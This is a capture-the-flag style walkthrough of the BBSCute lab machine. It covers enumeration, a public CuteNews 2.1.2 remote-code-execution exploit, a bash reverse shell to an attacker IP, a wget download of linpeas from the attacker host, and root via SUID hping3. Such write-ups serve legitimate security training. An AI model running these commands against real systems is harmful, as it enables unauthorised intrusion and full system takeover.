# BBSCute

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.158.132
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages found:
    - `http://192.168.239.128/captcha.php`
    - `http://192.168.239.128/example.php`
    - `http://192.168.239.128/index.php`
    - `http://192.168.239.128/popup.php`
    - `http://192.168.239.128/print.php`
    - `http://192.168.239.128/rss.php`
    - `http://192.168.239.128/search.php`
    - `http://192.168.239.128/snippet.php`
    - `http://192.168.239.128/show_news.php`
    - `http://192.168.239.128/cdata/`
    - `http://192.168.239.128/core/`
    - `http://192.168.239.128/docs/`
    - `http://192.168.239.128/libs/`
    - `http://192.168.239.128/skins/`
    - `http://192.168.239.128/manual/`
    - `http://192.168.239.128/LICENSE.txt`
- **88** — HTTP (nginx 1.14.2)
- **110** — POP3 (Courier pop3d)
- **995** — SSL/POP3 (Courier pop3d)

The root path returned the Apache default page. The `/captcha.php` endpoint displayed a CAPTCHA code. The `/example.php` page contained a search bar for news articles, with links pointing to `http://cute.calipendula`. Added this hostname to `/etc/hosts`:

```
192.168.239.128 cute.calipendula
```

The site is powered by CutePHP CMS, which supports plugin widgets. The `/index.php` page was the CuteNews login page. Other endpoints (`/popup.php`, `/print.php`, `/rss.php`, `/search.php`, `/snippet.php`, `/show_news.php`) returned either blank pages or informational messages.

### Directory Busting

Performed directory busting on several paths using `feroxbuster`:

The `/cdata/` path revealed subdirectories including `news/`, `archives/`, `users/`, `plugins/`, `template/`, `log/`, `cache/`, and `backup/`. Notable files included cache files and an archive file.

The `/core/` path revealed `tools/`, `includes/`, `lang/`, `modules/`, `db/`, and `captcha/` subdirectories.

The `/docs/` and `/libs/` paths returned nothing of interest (only fonts, CSS, and JS files). The `/manual/` path served Apache HTTP Server documentation.

### Exploitation

Checked vulnerabilities in CuteNews using `searchsploit`:

```
searchsploit cutenews | grep -i remote
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)              | php/remote/46698.rb
CuteNews 2.1.2 - Remote Code Execution                                     | php/webapps/48800.py
```

Downloaded and modified the RCE script (48800), removing the CuteNews path prefix from all URLs, then ran it against the target:

```
searchsploit -m 48800
python3 48800.py
Enter the URL> http://192.168.239.128
```

Upgraded the resulting reverse shell:

```
command > which bash
/usr/bin/bash

command > bash -c 'exec bash -i &> /dev/tcp/192.168.45.198/4444 <&1'

www-data@lab-pg-debian10-bbscute-244-189:/var/www/html/uploads$ whoami
www-data
```

Retrieved the local flag:

```
www-data@lab-pg-debian10-bbscute-244-189:/var/www/html/uploads$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@lab-pg-debian10-bbscute-244-189:/var/www/html/uploads$ cat /var/www/local.txt
bdf56437cf9496017bcc03d8d6fff7da
```

## Privilege escalation

Uploaded linpeas.sh via a Python HTTP server on the host:

```
# Host
python3 -m http.server 9001
ip a
inet 192.168.45.212/24

# Target
www-data@lab-pg-debian10-bbscute-244-189:/var/www/html/uploads$ cd /tmp
www-data@lab-pg-debian10-bbscute-244-189:/tmp$ which wget
/usr/bin/wget
www-data@lab-pg-debian10-bbscute-244-189:/tmp$ wget http://192.168.45.198:9001/linpeas.sh
```

Ran linpeas.sh and noted that `copyfail` and `DirtyFrag` did not work. The key finding was a SUID binary:

```
-rwsr-sr-x 1 root root 154K Sep  6  2014 /usr/sbin/hping3
```

Gained a privileged shell using `hping3` (via GTFOBins):

```
www-data@lab-pg-debian10-bbscute-244-189:/tmp$ hping3
hping3> /bin/sh -p

# whoami
root
```

Retrieved the proof flag:

```
# cd /root
# cat proof.txt
12a155b355bc91c6610247be0c7ade3a
```
